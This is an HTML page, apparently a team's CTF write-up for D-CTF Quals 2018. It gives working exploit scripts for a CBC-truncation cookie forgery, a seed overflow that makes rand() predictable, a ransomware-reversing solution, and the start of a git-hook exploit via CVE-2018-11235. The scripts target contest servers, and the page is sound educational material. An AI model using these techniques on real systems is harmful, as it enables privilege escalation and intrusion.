@@ -1,0 +1,520 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>D-CTF Quals 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#get-admin">get-admin</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reverse
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#ransomware">ransomware</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                exploit
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#lucky?">lucky?</a>
+    
+                <a class="dropdown-item" href="#even-more-lucky?">even-more-lucky?</a>
+    
+                <a class="dropdown-item" href="#online-linter">online-linter</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#get-admin" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">get-admin</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reverse</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#ransomware" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">ransomware</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">exploit</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#lucky?" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">lucky?</span>
+            </a>
+    
+<a href="#even-more-lucky?" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">even-more-lucky?</span>
+            </a>
+    
+<a href="#online-linter" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">online-linter</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="d-ctf-quals-2018"><a class="header-link" href="#d-ctf-quals-2018"></a>D-CTF Quals 2018</h1>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="get-admin"><a class="header-link" href="#get-admin"></a>Get Admin</h3>
+<p>In order to get admin, the objective is to make <code>$u[&#39;id&#39;]=1</code> in the encrpted cookies. The ability we have is that we can register arbitrary unique username and email. The server will always return the encrypted cookie for us.</p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_COOKIE[<span class="hljs-string">'user'</span>])) {                                                                                                                     
+    $u = decryptCookie($_COOKIE[<span class="hljs-string">'user'</span>]);
+
+    <span class="hljs-keyword">if</span>($u[<span class="hljs-string">'id'</span>] &gt; <span class="hljs-number">0</span>) { 
+        $_SESSION[<span class="hljs-string">'userid'</span>] = $u[<span class="hljs-string">'id'</span>];
+        header(<span class="hljs-string">"Location: /admin.php"</span>);
+        <span class="hljs-keyword">exit</span>;
+    } 
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">'Invalid cookie.'</span>);
+} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'username'</span>], $_POST[<span class="hljs-string">'password'</span>])) { 
+    $auth = <span class="hljs-keyword">new</span> AuthLib($db);
+    $userid = (int) $auth-&gt;authenticate($_POST[<span class="hljs-string">'username'</span>], $_POST[<span class="hljs-string">'password'</span>]);
+    <span class="hljs-keyword">if</span> ($userid) { 
+        $q = $db-&gt;query(<span class="hljs-string">'SELECT * FROM `users` where id='</span>.$userid);
+        $row = $q-&gt;fetch(\PDO::FETCH_ASSOC);
+
+        $_SESSION[<span class="hljs-string">'userid'</span>] = $userid;
+
+        setcookie(<span class="hljs-string">'user'</span>,encryptCookie([
+            <span class="hljs-string">'id'</span> =&gt; $userid,
+            <span class="hljs-string">'username'</span> =&gt; $_POST[<span class="hljs-string">'username'</span>],
+            <span class="hljs-string">'email'</span> =&gt; $row[<span class="hljs-string">'email'</span>], 
+        ]), time()+<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>);
+
+        header(<span class="hljs-string">"Location: /admin.php"</span>);
+        <span class="hljs-keyword">exit</span>;
+    } 
+} </code></pre><p>But how does the cookie get encrypted? It basically uses its homemade encoding - using <code>÷¡</code> as the separator and encrypting the array in AES-128-CBC. It will also check the CRC32 checksum.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">compress</span><span class="hljs-params">($arr)</span> </span>{
+    <span class="hljs-keyword">return</span> implode(<span class="hljs-string">'÷'</span>, array_map(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">($v, $k)</span> </span>{ <span class="hljs-keyword">return</span> $k.<span class="hljs-string">'¡'</span>.$v; }, $arr, array_keys($arr) ));
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decompress</span><span class="hljs-params">($cookie)</span> </span>{
+    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/[^\x00-\x7F]+\ *(?:[^\x00-\x7F]| )*/im'</span>,$cookie, $m) == <span class="hljs-number">0</span>) {
+        <span class="hljs-keyword">echo</span>(<span class="hljs-string">'Decryption error (1).'</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+    }
+
+
+    $t = explode(<span class="hljs-string">"÷"</span>, $cookie);
+
+    $arr = [];
+    <span class="hljs-keyword">foreach</span>($t <span class="hljs-keyword">as</span> $el) { 
+        $el = explode(<span class="hljs-string">"¡"</span>, $el); 
+        $arr[$el[<span class="hljs-number">0</span>]] = $el[<span class="hljs-number">1</span>];
+    } 
+
+    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($arr[<span class="hljs-string">'checksum'</span>])) {
+        <span class="hljs-keyword">echo</span>(<span class="hljs-string">'Decryption error (2).'</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+    }
+
+    $checksum = intval($arr[<span class="hljs-string">'checksum'</span>]);
+    <span class="hljs-keyword">unset</span>($arr[<span class="hljs-string">'checksum'</span>]);
+    $cookie = compress($arr);
+    <span class="hljs-keyword">if</span>($checksum != crc32($cookie)) {
+        <span class="hljs-keyword">echo</span>(<span class="hljs-string">'Decryption error (3).'</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+    } 
+
+    <span class="hljs-keyword">return</span> $arr;
+}
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encryptCookie</span><span class="hljs-params">($arr)</span> </span>{
+    $cookie = compress($arr);
+    $arr[<span class="hljs-string">'checksum'</span>] = crc32($cookie); 
+    <span class="hljs-keyword">return</span> encrypt(compress($arr), AES_KEY, AES_IV);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decryptCookie</span><span class="hljs-params">($cypher)</span> </span>{ 
+    <span class="hljs-keyword">return</span> decompress(decrypt($cypher, AES_KEY, AES_IV));
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span><span class="hljs-params">($plaintext, $key, $iv)</span> </span>{
+    $length     = strlen($plaintext);
+    $ciphertext = openssl_encrypt($plaintext, <span class="hljs-string">'AES-128-CBC'</span>, $key, OPENSSL_RAW_DATA, $iv);
+    <span class="hljs-keyword">return</span> base64_encode($ciphertext) . sprintf(<span class="hljs-string">'%06d'</span>, $length);
+}
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrypt</span><span class="hljs-params">($ciphertext, $key, $iv)</span> </span>{
+    $length     = intval(substr($ciphertext, <span class="hljs-number">-6</span>, <span class="hljs-number">6</span>));
+    $ciphertext = substr($ciphertext, <span class="hljs-number">0</span>,<span class="hljs-number">-6</span>);
+    $output     = openssl_decrypt(base64_decode($ciphertext), <span class="hljs-string">'AES-128-CBC'</span>, $key, OPENSSL_RAW_DATA, $iv);
+    <span class="hljs-keyword">if</span>($output == <span class="hljs-keyword">FALSE</span>) {
+        <span class="hljs-keyword">echo</span>(<span class="hljs-string">'Decryption error (0).'</span>);
+        <span class="hljs-keyword">die</span>();
+    }
+    <span class="hljs-keyword">return</span> substr($output, <span class="hljs-number">0</span>, $length);
+}
+</code></pre><p>Let&#39;s analysis this snippet of code:</p>
+<ol class="list">
+<li>The length of the plaintext is appended after the ciphertext. Thus we can easily truncate the length plaintext.</li>
+<li>CRC32 is checksum algorithm. It&#39;s not hash. We can easily compute the checksum of a given input without knowing the AES key.</li>
+<li>It&#39;s possible to include the token <code>÷¡</code> in username or email. We can leverage <code>explode(TOKEN)</code> to manipulate the array.</li>
+<li>When decompressing, the array will simply overwrite the existing key value pair.</li>
+<li>What we want is to make <code>id=0</code> in the array.</li>
+</ol>
+<p>Can we forge ciphertext of <code>id¡1÷username¡abcde÷email¡abcde÷checksum¡12345678</code>? Yes, just with some manipulation on CBC. We first make the server ecnrypt the following:</p>
+<ul class="list">
+<li>username: <code>T84be7a4dc9</code></li>
+<li>password: don&#39;t care</li>
+<li>email: <code>afbaf19bb997÷id¡1÷checksum¡1594149360</code></li>
+</ul>
+<p>And we will acquire the ciphertext of the following payload:</p>
+<pre class="hljs"><code>id¡112÷username¡T84be7a4dc9÷email¡afbaf19bb997÷id¡1÷checksum¡1594149360÷checksum¡2503531596
+
+b'id<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>a1112<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>b7usernam'
+b'e<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>a1T84be7a4dc9<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>b7'
+b'email<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>a1afbaf19bb'
+b'997<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>b7id<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>a11<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>b7chec'
+b'ksum<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>a11594149360'
+b'<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>b7checksum<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>a12503'
+b'531596'</code></pre><p>What if we truncate the last 2 blocks (32 bytes)?</p>
+<pre class="hljs"><code>id¡112÷username¡T84be7a4dc9÷email¡afbaf19bb997÷id¡1÷checksum¡1594149360
+
+b'id<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>a1112<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>b7usernam'
+b'e<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>a1T84be7a4dc9<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>b7'
+b'email<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>a1afbaf19bb'
+b'997<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>b7id<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>a11<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>b7chec'
+b'ksum<span class="hljs-symbol">\x</span>c2<span class="hljs-symbol">\x</span>a11594149360'</code></pre><p>The username and email is crafted to pad the block and the checksum can be pre-computed with ease. <code>id=1</code> is then successfully overwritten.</p>
+<p>Here is the script. Note that because length of id and checksum is not fixed, sometimes we have to manually pad/unpad the bytes. </p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> secrets
+<span class="hljs-keyword">import</span> zlib
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote, quote
+<span class="hljs-keyword">import</span> base64
+s = requests.session()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fold16</span><span class="hljs-params">(c)</span>:</span>
+    <span class="hljs-keyword">return</span> [c[i * <span class="hljs-number">16</span>:(i+<span class="hljs-number">1</span>) * <span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(c)//<span class="hljs-number">16</span>+<span class="hljs-number">1</span>)]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">compress</span><span class="hljs-params">(_id, user, mail)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_compress</span><span class="hljs-params">(_id, user, mail, checksum=None)</span>:</span>
+        <span class="hljs-keyword">if</span> checksum:
+            <span class="hljs-keyword">return</span> f<span class="hljs-string">'id¡{_id}÷username¡{user}÷email¡{mail}÷checksum¡{checksum}'</span>
+        <span class="hljs-keyword">return</span> f<span class="hljs-string">'id¡{_id}÷username¡{user}÷email¡{mail}'</span>
+    checksum = zlib.crc32(_compress(_id, user, mail).encode())
+    <span class="hljs-keyword">return</span> _compress(_id, user, mail, checksum)
+
+username = <span class="hljs-string">'T'</span>+secrets.token_hex(<span class="hljs-number">5</span>)
+password = <span class="hljs-string">'socute&lt;3'</span>
+mail = secrets.token_hex(<span class="hljs-number">6</span>)
+print(username, password)
+fixed_checksum = compress(<span class="hljs-number">1</span>, username, mail).split(<span class="hljs-string">'¡'</span>)[<span class="hljs-number">-1</span>]
+print(fixed_checksum)
+payload = mail + f<span class="hljs-string">'÷id¡1÷checksum¡{fixed_checksum}'</span>
+c = compress(<span class="hljs-number">112</span>, username, payload).encode()
+print(c.decode())
+print(*fold16(c), sep=<span class="hljs-string">'\n'</span>)
+aasdw
+
+<span class="hljs-comment"># register</span>
+s.post(<span class="hljs-string">'https://admin.dctfq18.def.camp/register.php'</span>, data={
+    <span class="hljs-string">'username'</span>: username,
+    <span class="hljs-string">'password'</span>: password,
+    <span class="hljs-string">'confirm_password'</span>: password,
+    <span class="hljs-string">'email'</span>: payload,
+})
+s.post(<span class="hljs-string">'https://admin.dctfq18.def.camp/'</span>, data={<span class="hljs-string">'username'</span>: username, <span class="hljs-string">'password'</span>: password})
+cookie = s.cookies.get_dict()[<span class="hljs-string">'user'</span>]
+l = int(cookie[<span class="hljs-number">-6</span>:])
+print(<span class="hljs-string">'plaintext len = '</span>, int(cookie[<span class="hljs-number">-6</span>:]))
+cookie = cookie[:<span class="hljs-number">-6</span>]
+print(cookie)
+dec = base64.b64decode(unquote(cookie))
+print(*fold16(dec), sep=<span class="hljs-string">'\n'</span>)
+<span class="hljs-keyword">assert</span> len(dec) == <span class="hljs-number">16</span> * <span class="hljs-number">7</span>
+crop = dec
+new_cookie = quote(base64.b64encode(crop)) + str(<span class="hljs-number">64</span>+<span class="hljs-number">16</span>).zfill(<span class="hljs-number">6</span>)
+r = requests.get(<span class="hljs-string">'https://admin.dctfq18.def.camp/'</span>, cookies=dict(user=new_cookie))
+print(r.status_code)
+print(r.text)
+<span class="hljs-comment">#DCTF{4EF853DFC818AFEC39497CD1B91625F9E6E19D34D8E43E56722026F26A95F13E}</span></code></pre><h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
+<h3 id="ransomware"><a class="header-link" href="#ransomware"></a>ransomware</h3>
+<p>this chal provides two file: <code>ransomware.pyc</code> and <code>youfool!.exe</code>.
+First use <code>uncompyle6</code> to get <code>ransomware.py</code>, and change the symbols inside it, we got the following code.</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> itertools
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">caesar_cipher</span><span class="hljs-params">(text, key)</span>:</span>
+    key = key * (len(text) / len(key) + <span class="hljs-number">1</span>)
+    <span class="hljs-keyword">return</span> (<span class="hljs-string">''</span>).join((chr(ord(text_chr) ^ ord(key_chr)) <span class="hljs-keyword">for</span> text_chr, key_chr <span class="hljs-keyword">in</span> itertools.izip(text, key)))
+
+
+f = open(<span class="hljs-string">'./FlagDCTF.pdf'</span>, <span class="hljs-string">'r'</span>)
+buf = f.read()
+f.close()
+allchar = string.ascii_letters + string.punctuation + string.digits
+password = (<span class="hljs-string">''</span>).join((choice(allchar) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(randint(<span class="hljs-number">60</span>, <span class="hljs-number">60</span>))))
+buf = caesar_cipher(buf, password)
+f = open(<span class="hljs-string">'./youfool!.exe'</span>, <span class="hljs-string">'w'</span>)
+buf = f.write(buf)
+f.close()</code></pre><p>we can see that flag is probably in a PDF form.
+After some google searching, we found that PDF structure is quite variable, however most of the structure are of printable ascii and readable words, with help of <a href="https://web.archive.org/web/20141010035745/http://gnupdf.org/Introduction_to_PDF">this website</a> and a PDF we generated for reference, we mainly work on the following structure.</p>
+<ol class="list">
+<li>PDF start with <code>%PDF-1.</code></li>
+<li>PDF end with <code>\n%%EOF\n</code></li>
+<li>structure of <pre class="hljs"><code> n <span class="hljs-number">0</span> obj
+ ...
+ endobj</code></pre> where <code>n</code> is an increasing integer</li>
+<li>structure of<pre class="hljs"><code> <span class="hljs-keyword">stream
+</span> ...
+ endstream</code></pre>With the 4 above structures, we finally recover the PDF step by step along with the key <code>:P-@uSL&quot;Y1K$[X)fg[|&quot;.45Yq9i&gt;eV)&lt;0C:(&#39;q4nP[hGd/EeX+E7,2O&quot;+:[2</code></li>
+</ol>
+<p>flag : <code>DCTF{d915b5e076215c3efb92e5844ac20d0620d19b15d427e207fae6a3b894f91333}</code></p>
+<h2 id="exploit"><a class="header-link" href="#exploit"></a>Exploit</h2>
+<h3 id="lucky?"><a class="header-link" href="#lucky?"></a>Lucky?</h3>
+<p>This chal provides us a program which first read your name and then ask you to guess 100 number generated by calling <code>rand()</code>. Since the user name is <code>strcpy</code> into a buffer, the seed fed into <code>srand</code> can be overwritten, thus the <code>rand()</code> become predictable.
+I first use <code>lucky.c</code> generate 100 <code>rand()</code> output, then send it by <code>lucky.py</code></p>
+<pre class="hljs"><code><span class="hljs-comment">//lucky.c</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+    srand(<span class="hljs-number">0x61616161</span>);
+    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>];
+    <span class="hljs-keyword">int</span> fd = open(<span class="hljs-string">"see"</span>, O_RDWR);
+    <span class="hljs-keyword">int</span> ret;
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++){
+        ret = <span class="hljs-built_in">snprintf</span>(buf, <span class="hljs-number">99</span>, <span class="hljs-string">"%d\n"</span>, rand());
+        write(fd, buf, ret);
+    }
+    close(fd);
+}</code></pre><pre class="hljs"><code><span class="hljs-comment"># lucky.py</span>
+<span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+host = <span class="hljs-string">'167.99.143.206'</span>
+port = <span class="hljs-number">65031</span>  
+
+r = remote(host, port)
+f = open(<span class="hljs-string">'see'</span>, <span class="hljs-string">'r'</span>)
+x = f.read().split(<span class="hljs-string">'\n'</span>)[:<span class="hljs-number">-1</span>]
+r.recvuntil(<span class="hljs-string">'?'</span>)
+r.sendline(<span class="hljs-string">'a'</span>*<span class="hljs-number">704</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):
+    r.recvuntil(<span class="hljs-string">']'</span>)
+    r.sendline(str(x[i]))
+    <span class="hljs-keyword">print</span> (i)
+r.interactive()</code></pre><p>flag : <code>DCTF{8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa}</code></p>
+<h3 id="even-more-lucky?"><a class="header-link" href="#even-more-lucky?"></a>Even more lucky?</h3>
+<p>This time the seed fed into <code>srand()</code> is <code>time(NULL) / 10</code>. No need to be too lucky.
+I first compile <code>lucky2.c</code> into a.out, then call it by <code>lucky2.py</code></p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>{
+    <span class="hljs-keyword">int</span> seed = atoi(argv[<span class="hljs-number">1</span>]);
+    srand(seed);
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++){
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, rand());
+    }
+}</code></pre><pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> time
+<span class="hljs-keyword">import</span> os
+host = <span class="hljs-string">'167.99.143.206'</span>
+port = <span class="hljs-number">65032</span>
+r = remote(host, port)
+x = time.time()
+r.recvuntil(<span class="hljs-string">'?'</span>)
+r.sendline(<span class="hljs-string">'a'</span>)
+os.system(<span class="hljs-string">'./a.out '</span> + str(x // <span class="hljs-number">10</span>) + <span class="hljs-string">' &gt; see'</span>)
+f = open(<span class="hljs-string">'see'</span>, <span class="hljs-string">'r'</span>)
+x = f.read().split(<span class="hljs-string">'\n'</span>)[:<span class="hljs-number">-1</span>]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">100</span>):
+    r.recvuntil(<span class="hljs-string">']'</span>)
+    r.sendline(str(x[i]))
+    <span class="hljs-keyword">print</span> (i)
+r.interactive()</code></pre><p>flag : <code>DCTF{2e7aaa899a8b212ea6ebda3112d24559f2d2c540a9a29b1b47477ae8e5f20ace}</code></p>
+<h3 id="online-linter"><a class="header-link" href="#online-linter"></a>Online Linter</h3>
+<p>(bookgin)</p>
+<p>The web service will clone a repository from a user-privided url, and perform some PHP syntax check on <code>*.php</code> files.</p>
+<p>After a few tries we quickly note that the command is not only <code>git clone URL</code>. It uses this argument <code>--recurse-submodules</code>. My intuition is can we leverage this to write some evil code in <a href="https://git-scm.com/docs/githooks">git hooks</a>?</p>
+<p>A quick Google we found <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-11235">CVE-2018-11235</a>, which adds malicious script in post-checkout githook. The PoC of this CVE is <a href="https://github.com/Rogdham/CVE-2018-11235">availble on GitHub</a>.</p>
+<p>Then, set up the git repo via:</p>
